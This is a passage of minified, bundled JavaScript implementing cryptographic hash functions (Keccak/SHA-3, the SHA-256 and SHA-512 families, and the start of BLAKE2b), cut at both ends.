        function qu(e, t) {
            zu(e);
            const r = t.outputLen;
            if (e.length < r)
                throw new Error("digestInto() expects output buffer of length at least " + r)
        }
        function Gu(e) {
            return new Uint32Array(e.buffer,e.byteOffset,Math.floor(e.byteLength / 4))
        }
        function $u() {
            for (var e = arguments.length, t = new Array(e), r = 0; r < e; r++)
                t[r] = arguments[r];
            for (let n = 0; n < t.length; n++)
                t[n].fill(0)
        }
        function Ku(e) {
            return new DataView(e.buffer,e.byteOffset,e.byteLength)
        }
        function Zu(e, t) {
            return e << 32 - t | e >>> t
        }
        const Yu = 68 === new Uint8Array(new Uint32Array([287454020]).buffer)[0];
        function Ju(e) {
            return e << 24 & 4278190080 | e << 8 & 16711680 | e >>> 8 & 65280 | e >>> 24 & 255
        }
        const Xu = Yu ? e => e : e => Ju(e);
        const Qu = Yu ? e => e : function(e) {
            for (let t = 0; t < e.length; t++)
                e[t] = Ju(e[t]);
            return e
        }
        ;
        function ed(e) {
            return "string" == typeof e && (e = function(e) {
                if ("string" != typeof e)
                    throw new Error("string expected");
                return new Uint8Array((new TextEncoder).encode(e))
            }(e)),
            zu(e),
            e
        }
        class td {
        }
        function rd(e) {
            const t = t => e().update(ed(t)).digest()
              , r = e();
            return t.outputLen = r.outputLen,
            t.blockLen = r.blockLen,
            t.create = () => e(),
            t
        }
        function nd() {
            let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 32;
            if (Lu && "function" == typeof Lu.getRandomValues)
                return Lu.getRandomValues(new Uint8Array(e));
            if (Lu && "function" == typeof Lu.randomBytes)
                return Uint8Array.from(Lu.randomBytes(e));
            throw new Error("crypto.getRandomValues must be defined")
        }
        const od = BigInt(0)
          , id = BigInt(1)
          , sd = BigInt(2)
          , ad = BigInt(7)
          , cd = BigInt(256)
          , ld = BigInt(113)
          , ud = []
          , dd = []
          , hd = [];
        for (let r = 0, zK = id, VK = 1, HK = 0; r < 24; r++) {
            [VK,HK] = [HK, (2 * VK + 3 * HK) % 5],
            ud.push(2 * (5 * HK + VK)),
            dd.push((r + 1) * (r + 2) / 2 % 64);
            let e = od;
            for (let t = 0; t < 7; t++)
                zK = (zK << id ^ (zK >> ad) * ld) % cd,
                zK & sd && (e ^= id << (id << BigInt(t)) - id);
            hd.push(e)
        }
        const fd = Pu(hd, !0)
          , pd = fd[0]
          , gd = fd[1]
          , yd = (e, t, r) => r > 32 ? ( (e, t, r) => t << r - 32 | e >>> 64 - r)(e, t, r) : ( (e, t, r) => e << r | t >>> 32 - r)(e, t, r)
          , md = (e, t, r) => r > 32 ? ( (e, t, r) => e << r - 32 | t >>> 64 - r)(e, t, r) : ( (e, t, r) => t << r | e >>> 32 - r)(e, t, r);
        class bd extends td {
            constructor(e, t, r) {
                let n = arguments.length > 3 && void 0 !== arguments[3] && arguments[3]
                  , o = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : 24;
                if (super(),
                this.pos = 0,
                this.posOut = 0,
                this.finished = !1,
                this.destroyed = !1,
                this.enableXOF = !1,
                this.blockLen = e,
                this.suffix = t,
                this.outputLen = r,
                this.enableXOF = n,
                this.rounds = o,
                ju(r),
                !(0 < e && e < 200))
                    throw new Error("only keccak-f1600 function is supported");
                this.state = new Uint8Array(200),
                this.state32 = Gu(this.state)
            }
            clone() {
                return this._cloneInto()
            }
            keccak() {
                Qu(this.state32),
                function(e) {
                    let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 24;
                    const r = new Uint32Array(10);
                    for (let n = 24 - t; n < 24; n++) {
                        for (let n = 0; n < 10; n++)
                            r[n] = e[n] ^ e[n + 10] ^ e[n + 20] ^ e[n + 30] ^ e[n + 40];
                        for (let n = 0; n < 10; n += 2) {
                            const t = (n + 8) % 10
                              , o = (n + 2) % 10
                              , i = r[o]
                              , s = r[o + 1]
                              , a = yd(i, s, 1) ^ r[t]
                              , c = md(i, s, 1) ^ r[t + 1];
                            for (let r = 0; r < 50; r += 10)
                                e[n + r] ^= a,
                                e[n + r + 1] ^= c
                        }
                        let t = e[2]
                          , o = e[3];
                        for (let r = 0; r < 24; r++) {
                            const n = dd[r]
                              , i = yd(t, o, n)
                              , s = md(t, o, n)
                              , a = ud[r];
                            t = e[a],
                            o = e[a + 1],
                            e[a] = i,
                            e[a + 1] = s
                        }
                        for (let n = 0; n < 50; n += 10) {
                            for (let t = 0; t < 10; t++)
                                r[t] = e[n + t];
                            for (let t = 0; t < 10; t++)
                                e[n + t] ^= ~r[(t + 2) % 10] & r[(t + 4) % 10]
                        }
                        e[0] ^= pd[n],
                        e[1] ^= gd[n]
                    }
                    $u(r)
                }(this.state32, this.rounds),
                Qu(this.state32),
                this.posOut = 0,
                this.pos = 0
            }
            update(e) {
                Hu(this),
                zu(e = ed(e));
                const {blockLen: t, state: r} = this
                  , n = e.length;
                for (let o = 0; o < n; ) {
                    const i = Math.min(t - this.pos, n - o);
                    for (let t = 0; t < i; t++)
                        r[this.pos++] ^= e[o++];
                    this.pos === t && this.keccak()
                }
                return this
            }
            finish() {
                if (this.finished)
                    return;
                this.finished = !0;
                const {state: e, suffix: t, pos: r, blockLen: n} = this;
                e[r] ^= t,
                0 !== (128 & t) && r === n - 1 && this.keccak(),
                e[n - 1] ^= 128,
                this.keccak()
            }
            writeInto(e) {
                Hu(this, !1),
                zu(e),
                this.finish();
                const t = this.state
                  , {blockLen: r} = this;
                for (let n = 0, o = e.length; n < o; ) {
                    this.posOut >= r && this.keccak();
                    const i = Math.min(r - this.posOut, o - n);
                    e.set(t.subarray(this.posOut, this.posOut + i), n),
                    this.posOut += i,
                    n += i
                }
                return e
            }
            xofInto(e) {
                if (!this.enableXOF)
                    throw new Error("XOF is not possible for this instance");
                return this.writeInto(e)
            }
            xof(e) {
                return ju(e),
                this.xofInto(new Uint8Array(e))
            }
            digestInto(e) {
                if (qu(e, this),
                this.finished)
                    throw new Error("digest() was already called");
                return this.writeInto(e),
                this.destroy(),
                e
            }
            digest() {
                return this.digestInto(new Uint8Array(this.outputLen))
            }
            destroy() {
                this.destroyed = !0,
                $u(this.state)
            }
            _cloneInto(e) {
                const {blockLen: t, suffix: r, outputLen: n, rounds: o, enableXOF: i} = this;
                return e || (e = new bd(t,r,n,i,o)),
                e.state32.set(this.state32),
                e.pos = this.pos,
                e.posOut = this.posOut,
                e.finished = this.finished,
                e.rounds = o,
                e.suffix = r,
                e.outputLen = n,
                e.enableXOF = i,
                e.destroyed = this.destroyed,
                e
            }
        }
        const vd = ( (e, t, r) => rd(( () => new bd(t,e,r))))(1, 136, 32);
        function wd(e, t, r) {
            return e & t ^ ~e & r
        }
        function Td(e, t, r) {
            return e & t ^ e & r ^ t & r
        }
        class Ad extends td {
            constructor(e, t, r, n) {
                super(),
                this.finished = !1,
                this.length = 0,
                this.pos = 0,
                this.destroyed = !1,
                this.blockLen = e,
                this.outputLen = t,
                this.padOffset = r,
                this.isLE = n,
                this.buffer = new Uint8Array(e),
                this.view = Ku(this.buffer)
            }
            update(e) {
                Hu(this),
                zu(e = ed(e));
                const {view: t, buffer: r, blockLen: n} = this
                  , o = e.length;
                for (let i = 0; i < o; ) {
                    const s = Math.min(n - this.pos, o - i);
                    if (s !== n)
                        r.set(e.subarray(i, i + s), this.pos),
                        this.pos += s,
                        i += s,
                        this.pos === n && (this.process(t, 0),
                        this.pos = 0);
                    else {
                        const t = Ku(e);
                        for (; n <= o - i; i += n)
                            this.process(t, i)
                    }
                }
                return this.length += e.length,
                this.roundClean(),
                this
            }
            digestInto(e) {
                Hu(this),
                qu(e, this),
                this.finished = !0;
                const {buffer: t, view: r, blockLen: n, isLE: o} = this;
                let {pos: i} = this;
                t[i++] = 128,
                $u(this.buffer.subarray(i)),
                this.padOffset > n - i && (this.process(r, 0),
                i = 0);
                for (let u = i; u < n; u++)
                    t[u] = 0;
                (function(e, t, r, n) {
                    if ("function" == typeof e.setBigUint64)
                        return e.setBigUint64(t, r, n);
                    const o = BigInt(32)
                      , i = BigInt(4294967295)
                      , s = Number(r >> o & i)
                      , a = Number(r & i)
                      , c = n ? 4 : 0
                      , l = n ? 0 : 4;
                    e.setUint32(t + c, s, n),
                    e.setUint32(t + l, a, n)
                }
                )(r, n - 8, BigInt(8 * this.length), o),
                this.process(r, 0);
                const s = Ku(e)
                  , a = this.outputLen;
                if (a % 4)
                    throw new Error("_sha2: outputLen should be aligned to 32bit");
                const c = a / 4
                  , l = this.get();
                if (c > l.length)
                    throw new Error("_sha2: outputLen bigger than state");
                for (let u = 0; u < c; u++)
                    s.setUint32(4 * u, l[u], o)
            }
            digest() {
                const {buffer: e, outputLen: t} = this;
                this.digestInto(e);
                const r = e.slice(0, t);
                return this.destroy(),
                r
            }
            _cloneInto(e) {
                e || (e = new this.constructor),
                e.set(...this.get());
                const {blockLen: t, buffer: r, length: n, finished: o, destroyed: i, pos: s} = this;
                return e.destroyed = i,
                e.finished = o,
                e.length = n,
                e.pos = s,
                n % t && e.buffer.set(r),
                e
            }
            clone() {
                return this._cloneInto()
            }
        }
        const Ed = Uint32Array.from([1779033703, 3144134277, 1013904242, 2773480762, 1359893119, 2600822924, 528734635, 1541459225])
          , Pd = Uint32Array.from([3418070365, 3238371032, 1654270250, 914150663, 2438529370, 812702999, 355462360, 4144912697, 1731405415, 4290775857, 2394180231, 1750603025, 3675008525, 1694076839, 1203062813, 3204075428])
          , Cd = Uint32Array.from([1779033703, 4089235720, 3144134277, 2227873595, 1013904242, 4271175723, 2773480762, 1595750129, 1359893119, 2917565137, 2600822924, 725511199, 528734635, 4215389547, 1541459225, 327033209])
          , Sd = Uint32Array.from([1116352408, 1899447441, 3049323471, 3921009573, 961987163, 1508970993, 2453635748, 2870763221, 3624381080, 310598401, 607225278, 1426881987, 1925078388, 2162078206, 2614888103, 3248222580, 3835390401, 4022224774, 264347078, 604807628, 770255983, 1249150122, 1555081692, 1996064986, 2554220882, 2821834349, 2952996808, 3210313671, 3336571891, 3584528711, 113926993, 338241895, 666307205, 773529912, 1294757372, 1396182291, 1695183700, 1986661051, 2177026350, 2456956037, 2730485921, 2820302411, 3259730800, 3345764771, 3516065817, 3600352804, 4094571909, 275423344, 430227734, 506948616, 659060556, 883997877, 958139571, 1322822218, 1537002063, 1747873779, 1955562222, 2024104815, 2227730452, 2361852424, 2428436474, 2756734187, 3204031479, 3329325298])
          , Id = new Uint32Array(64);
        class Bd extends Ad {
            constructor() {
                super(64, arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 32, 8, !1),
                this.A = 0 | Ed[0],
                this.B = 0 | Ed[1],
                this.C = 0 | Ed[2],
                this.D = 0 | Ed[3],
                this.E = 0 | Ed[4],
                this.F = 0 | Ed[5],
                this.G = 0 | Ed[6],
                this.H = 0 | Ed[7]
            }
            get() {
                const {A: e, B: t, C: r, D: n, E: o, F: i, G: s, H: a} = this;
                return [e, t, r, n, o, i, s, a]
            }
            set(e, t, r, n, o, i, s, a) {
                this.A = 0 | e,
                this.B = 0 | t,
                this.C = 0 | r,
                this.D = 0 | n,
                this.E = 0 | o,
                this.F = 0 | i,
                this.G = 0 | s,
                this.H = 0 | a
            }
            process(e, t) {
                for (let u = 0; u < 16; u++,
                t += 4)
                    Id[u] = e.getUint32(t, !1);
                for (let u = 16; u < 64; u++) {
                    const e = Id[u - 15]
                      , t = Id[u - 2]
                      , r = Zu(e, 7) ^ Zu(e, 18) ^ e >>> 3
                      , n = Zu(t, 17) ^ Zu(t, 19) ^ t >>> 10;
                    Id[u] = n + Id[u - 7] + r + Id[u - 16] | 0
                }
                let {A: r, B: n, C: o, D: i, E: s, F: a, G: c, H: l} = this;
                for (let u = 0; u < 64; u++) {
                    const e = l + (Zu(s, 6) ^ Zu(s, 11) ^ Zu(s, 25)) + wd(s, a, c) + Sd[u] + Id[u] | 0
                      , t = (Zu(r, 2) ^ Zu(r, 13) ^ Zu(r, 22)) + Td(r, n, o) | 0;
                    l = c,
                    c = a,
                    a = s,
                    s = i + e | 0,
                    i = o,
                    o = n,
                    n = r,
                    r = e + t | 0
                }
                r = r + this.A | 0,
                n = n + this.B | 0,
                o = o + this.C | 0,
                i = i + this.D | 0,
                s = s + this.E | 0,
                a = a + this.F | 0,
                c = c + this.G | 0,
                l = l + this.H | 0,
                this.set(r, n, o, i, s, a, c, l)
            }
            roundClean() {
                $u(Id)
            }
            destroy() {
                this.set(0, 0, 0, 0, 0, 0, 0, 0),
                $u(this.buffer)
            }
        }
        const xd = Pu(["0x428a2f98d728ae22", "0x7137449123ef65cd", "0xb5c0fbcfec4d3b2f", "0xe9b5dba58189dbbc", "0x3956c25bf348b538", "0x59f111f1b605d019", "0x923f82a4af194f9b", "0xab1c5ed5da6d8118", "0xd807aa98a3030242", "0x12835b0145706fbe", "0x243185be4ee4b28c", "0x550c7dc3d5ffb4e2", "0x72be5d74f27b896f", "0x80deb1fe3b1696b1", "0x9bdc06a725c71235", "0xc19bf174cf692694", "0xe49b69c19ef14ad2", "0xefbe4786384f25e3", "0x0fc19dc68b8cd5b5", "0x240ca1cc77ac9c65", "0x2de92c6f592b0275", "0x4a7484aa6ea6e483", "0x5cb0a9dcbd41fbd4", "0x76f988da831153b5", "0x983e5152ee66dfab", "0xa831c66d2db43210", "0xb00327c898fb213f", "0xbf597fc7beef0ee4", "0xc6e00bf33da88fc2", "0xd5a79147930aa725", "0x06ca6351e003826f", "0x142929670a0e6e70", "0x27b70a8546d22ffc", "0x2e1b21385c26c926", "0x4d2c6dfc5ac42aed", "0x53380d139d95b3df", "0x650a73548baf63de", "0x766a0abb3c77b2a8", "0x81c2c92e47edaee6", "0x92722c851482353b", "0xa2bfe8a14cf10364", "0xa81a664bbc423001", "0xc24b8b70d0f89791", "0xc76c51a30654be30", "0xd192e819d6ef5218", "0xd69906245565a910", "0xf40e35855771202a", "0x106aa07032bbd1b8", "0x19a4c116b8d2d0c8", "0x1e376c085141ab53", "0x2748774cdf8eeb99", "0x34b0bcb5e19b48a8", "0x391c0cb3c5c95a63", "0x4ed8aa4ae3418acb", "0x5b9cca4f7763e373", "0x682e6ff3d6b2b8a3", "0x748f82ee5defb2fc", "0x78a5636f43172f60", "0x84c87814a1f0ab72", "0x8cc702081a6439ec", "0x90befffa23631e28", "0xa4506cebde82bde9", "0xbef9a3f7b2c67915", "0xc67178f2e372532b", "0xca273eceea26619c", "0xd186b8c721c0c207", "0xeada7dd6cde0eb1e", "0xf57d4f7fee6ed178", "0x06f067aa72176fba", "0x0a637dc5a2c898a6", "0x113f9804bef90dae", "0x1b710b35131c471b", "0x28db77f523047d84", "0x32caab7b40c72493", "0x3c9ebe0a15c9bebc", "0x431d67c49c100d4c", "0x4cc5d4becb3e42b6", "0x597f299cfc657e2a", "0x5fcb6fab3ad6faec", "0x6c44198c4a475817"].map((e => BigInt(e))))
          , Od = xd[0]
          , _d = xd[1]
          , Wd = new Uint32Array(80)
          , Rd = new Uint32Array(80);
        class kd extends Ad {
            constructor() {
                super(128, arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : 64, 16, !1),
                this.Ah = 0 | Cd[0],
                this.Al = 0 | Cd[1],
                this.Bh = 0 | Cd[2],
                this.Bl = 0 | Cd[3],
                this.Ch = 0 | Cd[4],
                this.Cl = 0 | Cd[5],
                this.Dh = 0 | Cd[6],
                this.Dl = 0 | Cd[7],
                this.Eh = 0 | Cd[8],
                this.El = 0 | Cd[9],
                this.Fh = 0 | Cd[10],
                this.Fl = 0 | Cd[11],
                this.Gh = 0 | Cd[12],
                this.Gl = 0 | Cd[13],
                this.Hh = 0 | Cd[14],
                this.Hl = 0 | Cd[15]
            }
            get() {
                const {Ah: e, Al: t, Bh: r, Bl: n, Ch: o, Cl: i, Dh: s, Dl: a, Eh: c, El: l, Fh: u, Fl: d, Gh: h, Gl: f, Hh: p, Hl: g} = this;
                return [e, t, r, n, o, i, s, a, c, l, u, d, h, f, p, g]
            }
            set(e, t, r, n, o, i, s, a, c, l, u, d, h, f, p, g) {
                this.Ah = 0 | e,
                this.Al = 0 | t,
                this.Bh = 0 | r,
                this.Bl = 0 | n,
                this.Ch = 0 | o,
                this.Cl = 0 | i,
                this.Dh = 0 | s,
                this.Dl = 0 | a,
                this.Eh = 0 | c,
                this.El = 0 | l,
                this.Fh = 0 | u,
                this.Fl = 0 | d,
                this.Gh = 0 | h,
                this.Gl = 0 | f,
                this.Hh = 0 | p,
                this.Hl = 0 | g
            }
            process(e, t) {
                for (let b = 0; b < 16; b++,
                t += 4)
                    Wd[b] = e.getUint32(t),
                    Rd[b] = e.getUint32(t += 4);
                for (let b = 16; b < 80; b++) {
                    const e = 0 | Wd[b - 15]
                      , t = 0 | Rd[b - 15]
                      , r = Iu(e, t, 1) ^ Iu(e, t, 8) ^ Cu(e, 0, 7)
                      , n = Bu(e, t, 1) ^ Bu(e, t, 8) ^ Su(e, t, 7)
                      , o = 0 | Wd[b - 2]
                      , i = 0 | Rd[b - 2]
                      , s = Iu(o, i, 19) ^ xu(o, i, 61) ^ Cu(o, 0, 6)
                      , a = Bu(o, i, 19) ^ Ou(o, i, 61) ^ Su(o, i, 6)
                      , c = Nu(n, a, Rd[b - 7], Rd[b - 16])
                      , l = Fu(c, r, s, Wd[b - 7], Wd[b - 16]);
                    Wd[b] = 0 | l,
                    Rd[b] = 0 | c
                }
                let {Ah: r, Al: n, Bh: o, Bl: i, Ch: s, Cl: a, Dh: c, Dl: l, Eh: u, El: d, Fh: h, Fl: f, Gh: p, Gl: g, Hh: y, Hl: m} = this;
                for (let b = 0; b < 80; b++) {
                    const e = Iu(u, d, 14) ^ Iu(u, d, 18) ^ xu(u, d, 41)
                      , t = Bu(u, d, 14) ^ Bu(u, d, 18) ^ Ou(u, d, 41)
                      , v = u & h ^ ~u & p
                      , w = Uu(m, t, d & f ^ ~d & g, _d[b], Rd[b])
                      , T = Du(w, y, e, v, Od[b], Wd[b])
                      , A = 0 | w
                      , E = Iu(r, n, 28) ^ xu(r, n, 34) ^ xu(r, n, 39)
                      , P = Bu(r, n, 28) ^ Ou(r, n, 34) ^ Ou(r, n, 39)
                      , C = r & o ^ r & s ^ o & s
                      , S = n & i ^ n & a ^ i & a;
                    y = 0 | p,
                    m = 0 | g,
                    p = 0 | h,
                    g = 0 | f,
                    h = 0 | u,
                    f = 0 | d,
                    ({h: u, l: d} = Ru(0 | c, 0 | l, 0 | T, 0 | A)),
                    c = 0 | s,
                    l = 0 | a,
                    s = 0 | o,
                    a = 0 | i,
                    o = 0 | r,
                    i = 0 | n;
                    const I = ku(A, P, S);
                    r = Mu(I, T, E, C),
                    n = 0 | I
                }
                ({h: r, l: n} = Ru(0 | this.Ah, 0 | this.Al, 0 | r, 0 | n)),
                ({h: o, l: i} = Ru(0 | this.Bh, 0 | this.Bl, 0 | o, 0 | i)),
                ({h: s, l: a} = Ru(0 | this.Ch, 0 | this.Cl, 0 | s, 0 | a)),
                ({h: c, l: l} = Ru(0 | this.Dh, 0 | this.Dl, 0 | c, 0 | l)),
                ({h: u, l: d} = Ru(0 | this.Eh, 0 | this.El, 0 | u, 0 | d)),
                ({h: h, l: f} = Ru(0 | this.Fh, 0 | this.Fl, 0 | h, 0 | f)),
                ({h: p, l: g} = Ru(0 | this.Gh, 0 | this.Gl, 0 | p, 0 | g)),
                ({h: y, l: m} = Ru(0 | this.Hh, 0 | this.Hl, 0 | y, 0 | m)),
                this.set(r, n, o, i, s, a, c, l, u, d, h, f, p, g, y, m)
            }
            roundClean() {
                $u(Wd, Rd)
            }
            destroy() {
                $u(this.buffer),
                this.set(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
            }
        }
        class Md extends kd {
            constructor() {
                super(48),
                this.Ah = 0 | Pd[0],
                this.Al = 0 | Pd[1],
                this.Bh = 0 | Pd[2],
                this.Bl = 0 | Pd[3],
                this.Ch = 0 | Pd[4],
                this.Cl = 0 | Pd[5],
                this.Dh = 0 | Pd[6],
                this.Dl = 0 | Pd[7],
                this.Eh = 0 | Pd[8],
                this.El = 0 | Pd[9],
                this.Fh = 0 | Pd[10],
                this.Fl = 0 | Pd[11],
                this.Gh = 0 | Pd[12],
                this.Gl = 0 | Pd[13],
                this.Hh = 0 | Pd[14],
                this.Hl = 0 | Pd[15]
            }
        }
        const Nd = Uint32Array.from([573645204, 4230739756, 2673172387, 3360449730, 596883563, 1867755857, 2520282905, 1497426621, 2519219938, 2827943907, 3193839141, 1401305490, 721525244, 746961066, 246885852, 2177182882]);
        class Fd extends kd {
            constructor() {
                super(32),
                this.Ah = 0 | Nd[0],
                this.Al = 0 | Nd[1],
                this.Bh = 0 | Nd[2],
                this.Bl = 0 | Nd[3],
                this.Ch = 0 | Nd[4],
                this.Cl = 0 | Nd[5],
                this.Dh = 0 | Nd[6],
                this.Dl = 0 | Nd[7],
                this.Eh = 0 | Nd[8],
                this.El = 0 | Nd[9],
                this.Fh = 0 | Nd[10],
                this.Fl = 0 | Nd[11],
                this.Gh = 0 | Nd[12],
                this.Gl = 0 | Nd[13],
                this.Hh = 0 | Nd[14],
                this.Hl = 0 | Nd[15]
            }
        }
        const Ud = rd(( () => new Bd))
          , Dd = rd(( () => new kd))
          , Ld = rd(( () => new Md))
          , jd = rd(( () => new Fd))
          , zd = Uint8Array.from([0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 14, 10, 4, 8, 9, 15, 13, 6, 1, 12, 0, 2, 11, 7, 5, 3, 11, 8, 12, 0, 5, 2, 15, 13, 10, 14, 3, 6, 7, 1, 9, 4, 7, 9, 3, 1, 13, 12, 11, 14, 2, 6, 5, 10, 4, 0, 15, 8, 9, 0, 5, 7, 2, 4, 10, 15, 14, 1, 11, 12, 6, 8, 3, 13, 2, 12, 6, 10, 0, 11, 8, 3, 4, 13, 7, 5, 15, 14, 1, 9, 12, 5, 1, 15, 14, 13, 4, 10, 0, 7, 6, 3, 9, 2, 8, 11, 13, 11, 7, 14, 12, 1, 3, 9, 5, 0, 15, 4, 8, 6, 2, 10, 6, 15, 14, 9, 11, 3, 0, 8, 12, 2, 13, 7, 1, 4, 10, 5, 10, 2, 8, 4, 7, 6, 1, 5, 15, 11, 9, 14, 3, 12, 13, 0, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 14, 10, 4, 8, 9, 15, 13, 6, 1, 12, 0, 2, 11, 7, 5, 3, 11, 8, 12, 0, 5, 2, 15, 13, 10, 14, 3, 6, 7, 1, 9, 4, 7, 9, 3, 1, 13, 12, 11, 14, 2, 6, 5, 10, 4, 0, 15, 8, 9, 0, 5, 7, 2, 4, 10, 15, 14, 1, 11, 12, 6, 8, 3, 13, 2, 12, 6, 10, 0, 11, 8, 3, 4, 13, 7, 5, 15, 14, 1, 9])
          , Vd = Uint32Array.from([4089235720, 1779033703, 2227873595, 3144134277, 4271175723, 1013904242, 1595750129, 2773480762, 2917565137, 1359893119, 725511199, 2600822924, 4215389547, 528734635, 327033209, 1541459225])
          , Hd = new Uint32Array(32);
        function qd(e, t, r, n, o, i) {
            const s = o[i]
              , a = o[i + 1];
            let c = Hd[2 * e]
              , l = Hd[2 * e + 1]
              , u = Hd[2 * t]
              , d = Hd[2 * t + 1]
              , h = Hd[2 * r]
              , f = Hd[2 * r + 1]
              , p = Hd[2 * n]
              , g = Hd[2 * n + 1]
              , y = ku(c, u, s);
            l = Mu(y, l, d, a),
            c = 0 | y,
            ({Dh: g, Dl: p} = {
                Dh: g ^ l,
                Dl: p ^ c
            }),
            ({Dh: g, Dl: p} = {
                Dh: _u(0, p),
                Dl: Wu(g)
            }),
            ({h: f, l: h} = Ru(f, h, g, p)),
            ({Bh: d, Bl: u} = {
                Bh: d ^ f,
                Bl: u ^ h
            }),
            ({Bh: d, Bl: u} = {
                Bh: Iu(d, u, 24),
                Bl: Bu(d, u, 24)
            }),
            Hd[2 * e] = c,
            Hd[2 * e + 1] = l,
            Hd[2 * t] = u,
            Hd[2 * t + 1] = d,
            Hd[2 * r] = h,
            Hd[2 * r + 1] = f,
            Hd[2 * n] = p,
            Hd[2 * n + 1] = g
        }
        function Gd(e, t, r, n, o, i) {
            const s = o[i]
              , a = o[i + 1];
            let c = Hd[2 * e]
              , l = Hd[2 * e + 1]
              , u = Hd[2 * t]
              , d = Hd[2 * t + 1]
              , h = Hd[2 * r]
              , f = Hd[2 * r + 1]
              , p = Hd[2 * n]
              , g = Hd[2 * n + 1]
              , y = ku(c, u, s);
            l = Mu(y, l, d, a),
            c = 0 | y,
            ({Dh: g, Dl: p} = {
                Dh: g ^ l,
                Dl: p ^ c
            }),
            ({Dh: g, Dl: p} = {
                Dh: Iu(g, p, 16),
                Dl: Bu(g, p, 16)
            }),
            ({h: f, l: h} = Ru(f, h, g, p)),
            ({Bh: d, Bl: u} = {
                Bh: d ^ f,
                Bl: u ^ h
            }),
            ({Bh: d, Bl: u} = {
                Bh: xu(d, u, 63),
                Bl: Ou(d, u, 63)
            }),
            Hd[2 * e] = c,
            Hd[2 * e + 1] = l,
            Hd[2 * t] = u,
            Hd[2 * t + 1] = d,
            Hd[2 * r] = h,
            Hd[2 * r + 1] = f,
            Hd[2 * n] = p,
            Hd[2 * n + 1] = g
        }
        class $d extends td {
            constructor(e, t) {
                super(),
                this.finished = !1,
                this.destroyed = !1,
                this.length = 0,
                this.pos = 0,
                ju(e),
                ju(t),
                this.blockLen = e,
                this.outputLen = t,
                this.buffer = new Uint8Array(e),
                this.buffer32 = Gu(this.buffer)
            }
            update(e) {
                Hu(this),
                zu(e = ed(e));
                const {blockLen: t, buffer: r, buffer32: n} = this
                  , o = e.length
                  , i = e.byteOffset
                  , s = e.buffer;
                for (let a = 0; a < o; ) {
                    this.pos === t && (Qu(n),
                    this.compress(n, 0, !1),
                    Qu(n),
                    this.pos = 0);
                    const c = Math.min(t - this.pos, o - a)
                      , l = i + a;
                    if (c !== t || l % 4 || !(a + c < o))
                        r.set(e.subarray(a, a + c), this.pos),
                        this.pos += c,
                        this.length += c,
                        a += c;
                    else {
                        const e = new Uint32Array(s,l,Math.floor((o - a) / 4));
                        Qu(e);
                        for (let r = 0; a + t < o; r += n.length,
                        a += t)
                            this.length += t,
                            this.compress(e, r, !1);
                        Qu(e)
                    }
                }
                return this
            }
            digestInto(e) {
                Hu(this),
                qu(e, this);
                const {pos: t, buffer32: r} = this;
                this.finished = !0,
                $u(this.buffer.subarray(t)),
                Qu(r),
                this.compress(r, 0, !0),
                Qu(r);
                const n = Gu(e);
                this.get().forEach(( (e, t) => n[t] = Xu(e)))
            }
            digest() {
                const {buffer: e, outputLen: t} = this;
                this.digestInto(e);
                const r = e.slice(0, t);
                return this.destroy(),
                r
            }
            _cloneInto(e) {
                const {buffer: t, length: r, finished: n, destroyed: o, outputLen: i, pos: s} = this;
                return e || (e = new this.constructor({
                    dkLen: i
                })),
                e.set(...this.get()),
                e.buffer.set(t),
                e.destroyed = o,
                e.finished = n,
                e.length = r,
                e.pos = s,
                e.outputLen = i,
                e
            }
            clone() {
                return this._cloneInto()
            }
        }
        class Kd extends $d {
            constructor() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                const t = void 0 === e.dkLen ? 64 : e.dkLen;
                super(128, t),
                this.v0l = 0 | Vd[0],
                this.v0h = 0 | Vd[1],
                this.v1l = 0 | Vd[2],
                this.v1h = 0 | Vd[3],
                this.v2l = 0 | Vd[4],
                this.v2h = 0 | Vd[5],
                this.v3l = 0 | Vd[6],
                this.v3h = 0 | Vd[7],
                this.v4l = 0 | Vd[8],
                this.v4h = 0 | Vd[9],
                this.v5l = 0 | Vd[10],
                this.v5h = 0 | Vd[11],
                this.v6l = 0 | Vd[12],
                this.v6h = 0 | Vd[13],
                this.v7l = 0 | Vd[14],
                this.v7h = 0 | Vd[15],
                function(e) {
                    let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {}
                      , r = arguments.length > 2 ? arguments[2] : void 0
                      , n = arguments.length > 3 ? arguments[3] : void 0
                      , o = arguments.length > 4 ? arguments[4] : void 0;
                    if (ju(r),
                    e < 0 || e > r)
                        throw new Error("outputLen bigger than keyLen");
                    const {key: i, salt: s, personalization: a} = t;
                    if (void 0 !== i && (i.length < 1 || i.length > r))
                        throw new Error("key length must be undefined or 1.." + r);
                    if (void 0 !== s && s.length !== n)
                        throw new Error("salt must be undefined or " + n);
                    if (void 0 !== a && a.length !== o)
                        throw new Error("personalization must be undefined or " + o)
                }(t, e, 64, 16, 16);
                let {key: r, personalization: n, salt: o} = e
                  , i = 0;
                if (void 0 !== r && (r = ed(r),
                i = r.length),
                this.v0l ^= this.outputLen | i << 8 | 65536 | 1 << 24,
                void 0 !== o) {
                    o = ed(o);
                    const e = Gu(o);
                    this.v4l ^= Xu(e[0]),
                    this.v4h ^= Xu(e[1]),
                    this.v5l ^= Xu(e[2]),
                    this.v5h ^= Xu(e[3])
                }
                if (void 0 !== n) {
                    n = ed(n);
                    const e = Gu(n);
                    this.v6l ^= Xu(e[0]),
                    this.v6h ^= Xu(e[1]),
                    this.v7l ^= Xu(e[2]),
                    this.v7h ^= Xu(e[3])
                }
                if (void 0 !== r) {
                    const e = new Uint8Array(this.blockLen);
                    e.set(r),
                    this.update(e)
                }
            }
            get() {
                let {v0l: e, v0h: t, v1l: r, v1h: n, v2l: o, v2h: i, v3l: s, v3h: a, v4l: c, v4h: l, v5l: u, v5h: d, v6l: h, v6h: f, v7l: p, v7h: g} = this;
                return [e, t, r, n, o, i, s, a, c, l, u, d, h, f, p, g]
            }
            set(e, t, r, n, o, i, s, a, c, l, u, d, h, f, p, g) {
                this.v0l = 0 | e,
                this.v0h = 0 | t,
                this.v1l = 0 | r,
                this.v1h = 0 | n,
